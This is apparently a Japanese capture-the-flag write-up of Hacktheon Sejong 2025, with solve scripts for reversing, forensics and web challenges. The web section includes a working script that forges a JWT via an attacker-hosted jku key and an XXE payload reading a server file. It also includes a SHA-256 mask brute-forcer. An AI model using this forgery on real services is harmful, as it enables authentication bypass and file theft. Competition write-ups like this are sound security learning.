---
title: Hacktheon Sejong 2025 Writeup
date: 2025-04-26
layout: writeup
rank: 32
total_teams: ???
language: ja
tags:
  - Web
  - Rev
  - Forensics
---

# まえがき

2025 Hacktheon SejongのInternational Collegiate Cyber Security Competition（学部生だけが参加できて、40チームがオンサイトFinalに行ける）にチームsknbで参加しました。結果はAdvanced部門（部門がいくつかあり、Advanced部門からは上位20チームが決勝に行ける）32位で、オンサイト決勝には行けませんでした。チームとしては12問を解いて5762ptを、個人としてはそのうち9問を解いて4328ptを獲得しました。この記事は自分が解いた問題の簡易Writeupになります。
![](/assets/img/hacktheon_sejong_2025/b6fece677a78-20250426.png)

# I love reversing [rev/62solves]

Windows実行ファイルのRev問。Ghidraと睨めっこしたりChatGPTに投げたりすると内部でpythonを読んでいることが分かる。`pyinstxtractor`で`.pyc`ファイルを抽出できるので、そこからそれっぽい定数値を抜き出すスクリプトを書いた。

```py
# constants_extractor.py
import marshal, sys

def load_pyc(path):
    with open(path, 'rb') as f:
        header = f.read(16)   # ヘッダは 16 バイト
        code = marshal.loads(f.read())
    return code

def extract_consts(co):
    for const in co.co_consts:
        if isinstance(const, type(co)):
            print(f"\n--- Function: {const.co_name} ---")
            print([c for c in const.co_consts if isinstance(c, (int, float))])
            extract_consts(const)

if __name__ == "__main__":
    co = load_pyc(sys.argv[1])
    extract_consts(co)
```

`FLAG{2.593627}`

# Bridge [rev/57solves]

apkファイルのRev問。展開してガチャガチャしているとJNIメソッドを呼び出してシークレットをenc/decしていることが分かるので、`libbridge_lib.so`を見に行く。

```sh
$ file libbridge_lib.so 
libbridge_lib.so: ELF 64-bit LSB shared object, ARM aarch64, version 1 (SYSV), dynamically linked, stripped
```

ARMバイナリで少し恐れおののいたが、Ghidraに食わせた結果をChatGPTに渡すとFlagを見つけてくれた。
`FLAG{1325ed439e52bba40fedefaf5bec9458}`

# Barcode [rev/56solves]

8byteのHex文字列を8*8のグリッドに01で展開するっぽいバイナリが与えられる。これは普通のELFバイナリだった。実行結果が"FLAG"になるHex文字列を求めればそれがFlagになるらしいので、逆算するスクリプトを書いてあげれば良い。

期待する実行結果:

```
        
 ****** 
 *      
 ****** 
 *      
 *      
 *      
        
        
 *      
 *      
 *      
 *      
 *      
 ****** 
        
        
  ****  
 *    * 
 ****** 
 *    * 
 *    * 
 *    * 
        
        
  ****  
 *    * 
 *      
 *  *** 
 *    * 
  ****  
        
```

2文字目以降（FLAGのLから先）の挙動がおかしくなり沼っていたが、Bufferに前の文字の値が残っているっぽかったのでいい感じのXORを取って補正することで解決した。

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys

def parse_barcode(path):
    # ファイルを 1 行ずつ読み込み（改行なし）
    with open(path, 'r', encoding='utf-8') as f:
        lines = [line.rstrip('\n') for line in f]
    # 全行数が 8 の倍数か確認
    if len(lines) % 8 != 0:
        raise ValueError('行数が 8 の倍数ではありません')
    # 各行が 8 文字幅か確認
    for i, ln in enumerate(lines):
        if len(ln) != 8:
            raise ValueError(f'行 {i} の幅が 8 文字ではありません: {len(ln)}')
    blocks = len(lines) // 8  # この例では 4 ブロック
    all_bytes = []

    for bi in range(blocks):
        # 1 ブロック（8 行）の範囲抽出
        block = lines[bi*8:(bi+1)*8]
        # 各行ごとに 8 ビットを組み立て（bit0 が列 0、bit7 が列 7）
        # block[0] が最上行、block[7] が最下行
        row_bytes = []
        for r in range(8):
            b = 0
            for c in range(8):
                if block[r][c] == '*':
                    b |= 1 << c
            row_bytes.append(b)
        # プログラムは「最初のバイトが最下行」を想定しているので，行配列を逆順に
        row_bytes.reverse()
        # このブロックのバイト列を追加
        all_bytes.extend(row_bytes)

    # 16 進小文字文字列に変換
    hexstr = ''.join(f'{b:02x}' for b in all_bytes)
    return hexstr


def xor(str1, str2):
    """2 つの 16 進文字列を XOR する"""
    b1 = bytes.fromhex(str1)
    b2 = bytes.fromhex(str2)
    return bytes(a ^ b for a, b in zip(b1, b2)).hex()


def not_hex(str1):
    """16 進文字列を NOT する"""
    b1 = bytes.fromhex(str1)
    return bytes((~b & 0xFF) for b in b1).hex()


def main():
    if len(sys.argv) != 2:
        print(f'Usage: {sys.argv[0]} <barcode_file>')
        sys.exit(1)
    path = sys.argv[1]
    try:
        hexstr = parse_barcode(path)
    except Exception as e:
        print(f'Error: {e}', file=sys.stderr)
        sys.exit(1)
    str1 = hexstr[0:16]
    str2 = hexstr[16:32]
    str3 = hexstr[32:48]
    str4 = hexstr[48:64]
    print(str1, str2, str3, str4)
    str2 = not_hex(xor(str1, str2))
    str3 = not_hex(xor(str2, str3))
    str4 = not_hex(xor(str3, str4))
    print(str1 + str2 + str3 + str4)

if __name__ == '__main__':
    main()
```

`FLAG{0x000202027e027e00ff83ffff83ff83ff003e424202424000fffdffcfffff83ff}`

# pyrus [rev/36solves]

Pythonのパッケージが配布される。展開すると`pyrus.cpython-310-x86_64-linux-gnu.so`というバイナリが得られるが、これはおそらくRust製。全く読めたものじゃなかったので、ChatGPTをふんだんにぶん回して思い通りの結果が出るまでガチャった。

<https://chatgpt.com/share/680c8b56-4bec-8008-9662-c0fb4a2495b8>

もうrevでは逆立ちしてもChatGPTに勝てない。
`FLAG{a0b40748a66d458832a456ff86b43d85}`

# Shadow of the system [forensics/65solves]

Windowsのレジストリファイルが配布される。ファイルごとChatGPTに投げたら全部やってくれた。
`FLAG{8yp455_u4c_g37_5y5t3m}`

# Watch [forensics/63solves]

binファイルからbmpを抜き出して読む問題。スクリプトを書いたらあとはFlagっぽい文字列を探すだけ。完璧なスクリプトではないが、64x64のチャンク単位で抽出できているのでなんとか読めた。

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
bmc_collage.py
--------------
Cache0000.bin（RDP ビットマップキャッシュ v6）を読み取り、
すべてのタイルを 1 枚のコラージュ BMP に書き出す。

使い方:
    python bmc_collage.py Cache0000.bin            # tiles.bmp を生成
    python bmc_collage.py Cache0000.bin -c 32 -o collage.bmp
"""

import argparse
import math
import struct
from pathlib import Path
from PIL import Image


def read_tiles(buf: bytes):
    """Cache0000.bin から (64×64 RGBA, index) を順に yield"""
    if buf[:8] != b"RDP8bmp\x00" or struct.unpack_from("<I", buf, 8)[0] != 6:
        raise ValueError("RDP8bmp v6 ではありません")

    p = 12
    idx = 0
    while p + 12 <= len(buf):
        _key1, _key2, w, h = struct.unpack_from("<LLHH", buf, p)
        if w == 0 and h == 0:  # 終端
            break

        size = w * h * 4
        if p + 12 + size > len(buf):
            raise ValueError("不正な長さです")

        # BGRA → RGBA（Pillow が自動変換）
        img = Image.frombytes("RGBA", (w, h), buf[p + 12 : p + 12 + size])

        # 180° 回転（上下→左右）で本来の向きに
        img = img.transpose(Image.FLIP_TOP_BOTTOM).transpose(Image.FLIP_LEFT_RIGHT)

        # 64×64 へ白背景でパディング（Notepad のテキストは左上を使う）
        if (w, h) != (64, 64):
            pad = Image.new("RGBA", (64, 64), (255, 255, 255, 255))
            pad.paste(img, (0, 0))
            img = pad

        yield img, idx
        idx += 1
        p += 12 + size


def make_collage(tile_iter, per_row: int) -> Image.Image:
    """タイルを per_row 枚ずつ横に並べてコラージュを返す"""
    tiles = list(tile_iter)
    rows = math.ceil(len(tiles) / per_row)
    canvas = Image.new("RGBA", (64 * per_row, 64 * rows), (255, 255, 255, 255))
    for i, (img, _) in enumerate(tiles):
        r, c = divmod(i, per_row)
        canvas.paste(img, (c * 64, r * 64))
    return canvas


def main():
    ap = argparse.ArgumentParser(description="Cache0000.bin → 1 枚の BMP")
    ap.add_argument("cache", help="解析対象 Cache0000.bin")
    ap.add_argument("-c", "--columns", type=int, default=64,
                    help="1 行に並べるタイル数（既定 64）")
    ap.add_argument("-o", "--out", default="tiles.bmp",
                    help="出力ファイル名（既定 tiles.bmp）")
    args = ap.parse_args()

    buf = Path(args.cache).read_bytes()
    collage = make_collage(read_tiles(buf), args.columns)

    collage.convert("RGB").save(args.out, format="BMP")
    print(f"[+] {collage.width}×{collage.height}px で {args.out} を生成しました")


if __name__ == "__main__":
    main()
```

`FLAG{s0m3on3_1s_w4tch1n9_my_pc}`

# Cat [forensics/62solves]

原文が`?l?d?l?l?l?d!?d?d`という形式だということのみが分かった状態でHashを逆算する問題。頑張って総当たりする。
ただ総当たりするだけだと1時間くらいかかってしまうので並列化した。多分10分もかからなかったはず。

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import itertools
import hashlib
import multiprocessing
from concurrent.futures import ProcessPoolExecutor, as_completed
from tqdm import tqdm  # プログレスバー用

# マスク ?l?d?l?l?l?d!?d?d に対応する文字集合
LETTERS = 'abcdefghijklmnopqrstuvwxyz'
DIGITS  = '0123456789'
CHAR_SETS = [
    LETTERS,   # 1文字目: ?l
    DIGITS,    # 2文字目: ?d
    LETTERS,   # 3文字目: ?l
    LETTERS,   # 4文字目: ?l
    LETTERS,   # 5文字目: ?l
    DIGITS,    # 6文字目: ?d
    ['!'],     # 7文字目: リテラル '!'
    DIGITS,    # 8文字目: ?d
    DIGITS,    # 9文字目: ?d
]

TARGET_HASH = '27AC620A35D509F992EDC3F06DB3EC04C3610AE52F24F3CF13F29662EB4EF4F2'


def search_subspace(first_char: str) -> str:
    """
    先頭文字を first_char に固定したサブ空間（残り 8文字）を総当たり。
    見つかれば candidate を返し、なければ空文字を返す。
    """
    for suffix in itertools.product(*CHAR_SETS[1:]):
        candidate = first_char + ''.join(suffix)
        h = hashlib.sha256(candidate.encode()).hexdigest().upper()
        if h == TARGET_HASH:
            return candidate
    return ''


def main():
    # CPU コア数を取得して明示的に max_workers にセット
    cpu_cnt = multiprocessing.cpu_count()
    print(f"使用可能な CPU コア数: {cpu_cnt}")
    
    # ProcessPoolExecutor を生成
    with ProcessPoolExecutor(max_workers=cpu_cnt) as executor:
        # 実際に使われるワーカー数を内部属性から確認
        actual_workers = executor._max_workers
        print(f"並列化に使われるワーカー数: {actual_workers}\n")

        # 各プレフィックスごとにタスクを投入
        futures = {executor.submit(search_subspace, c): c for c in LETTERS}

        # tqdm で何文字分処理済かを可視化
        for future in tqdm(as_completed(futures), total=len(futures),
                           desc="Prefix chunks", unit="task"):
            result = future.result()
            if result:
                # 見つかったら残りキャンセルして終了
                print(f"\nFound! FLAG{{{result}}}")
                executor.shutdown(cancel_futures=True)
                return

    print("\nNot found.")


if __name__ == '__main__':
    main()
```

`FLAG{h4ckm3!25}`

# Hidden message [forensics/54solves]

ステガノグラフィ問。色々試していたら1bitLSBだということが分かったので、取り出す。
`FLAG{St3gan09raphy_15_Eazy~~!!}`

# Who's the admin now? [web/46solves]

`adminでログインしてね！`という典型的なWeb問。
tokenで認証周りを管理していて、jwtのheaderは以下のようになっていた。

```json
{
  "alg": "RS256",
  "cty": "application/json",
  "jku": "http://localhost:5010/jwks.json",
  "kid": "server-key",
  "typ": "JWT"
}
```

最初にalgを`none`や`HS256`に変更して改ざんを試みたが不発。次にjkuを弄ってみると良い感じだったので、自分で生成したRSA鍵ペアの公開鍵を自分のサーバーでホストしてそのURLをjkuに設定することで任意のpayloadで署名が通るようになった。
ちなみに適当に作ったアカウントのpayloadは以下のようになっていた。

```xml
  <user>
    <user_id>aaa@example.com</user_id>
    <username>aaa</username>
    <role>user</role>
  </user>
```

ただadminとしてログインしただけではFlagが取得できず、サーバーの`/FLAG`に配置してあるのでこれをどうにかして読み出す必要がある。XXEを使って良い感じにusernameとして表示させることができた。最終的なjwt改ざんスクリプトはこうなる。

```js
#!/usr/bin/env node
/**
 * 既存 JWT のヘッダー中 jku を固定 URL に差し替え、攻撃用鍵で再署名する
 *
 * 使い方:
 *   $ npm install jsonwebtoken
 *   $ node forge_jku_token_fixed.js <ORIGINAL_JWT>
 */

const fs  = require('fs');
const jwt = require('jsonwebtoken');

// 攻撃用秘密鍵のパス
const PRIVATE_KEY_PATH = './attacker_private.pem';
// jku ヘッダーに設定する固定 URL
const NEW_JKU_URL = 'https://ctf-server.claustra01.net/jwks.json';

// コマンドライン引数取得
const [,, originalToken] = process.argv;
if (!originalToken) {
  console.error('Usage: node forge_jku_token_fixed.js <ORIGINAL_JWT>');
  process.exit(1);
}

// 秘密鍵読み込み
let privateKey;
try {
  privateKey = fs.readFileSync(PRIVATE_KEY_PATH, 'utf8');
} catch (err) {
  console.error(`秘密鍵ファイルの読み込みに失敗: ${PRIVATE_KEY_PATH}`);
  process.exit(1);
}

// 元トークンをデコードしてヘッダー／ペイロード取得
const decoded = jwt.decode(originalToken, { complete: true });
if (!decoded || typeof decoded === 'string') {
  console.error('Invalid JWT format');
  process.exit(1);
}

const { header: origHeader, payload } = decoded;

// ヘッダーをコピーして jku を固定 URL に上書き、kid も攻撃用に
const newHeader = {
  ...origHeader,
  jku: NEW_JKU_URL,
  cty: 'application/xml',
  kid: 'server-key'
};

// payloadを上書き
const newPayload = {
  ...payload,
  "user_role": "admin",
  "user_info": `
  <!DOCTYPE user [<!ENTITY xxe SYSTEM "file:///FLAG" >]>
  <user>
    <user_id>aaa@example.com</user_id>
    <username>&xxe;</username>
    <role>admin</role>
  </user>
  `
};

// 再署名して改ざん済トークンを生成
let forgedToken;
try {
  forgedToken = jwt.sign(newPayload, privateKey, {
    algorithm: origHeader.alg,
    header: newHeader
  });
} catch (err) {
  console.error('トークン再署名に失敗:', err.message);
  process.exit(1);
}

console.log('--- Forged JWT ---');
console.log(forgedToken);
```

このtokenで自分のユーザーページにアクセスするとusernameの代わりにFlagが表示される。非常に面白い問題だった。
`FLAG{jku_4nd_xxe_4r3_d4ng3r0u5}`

# あとがき

GPT-o3,o4が有能すぎてrevやforensicsがサクサク解けましたが、あまり腰を据えてwebと向き合えなかったな～という気持ちです。まぁ9時間の短いCTFですし、案外こんなものでしょうか。取らなきゃいけない問題はきちんと取れたけど、差をつけるために取りたい問題は取れなかったなって感じです。あと2問くらい解けてたら決勝に行けてたので、かなり不完全燃焼です。
そして例によって、不定期で僕と一緒にゆるくCTFに参加してくれる方・チームを探しています。Webは多少できると思います。よろしくお願いします。
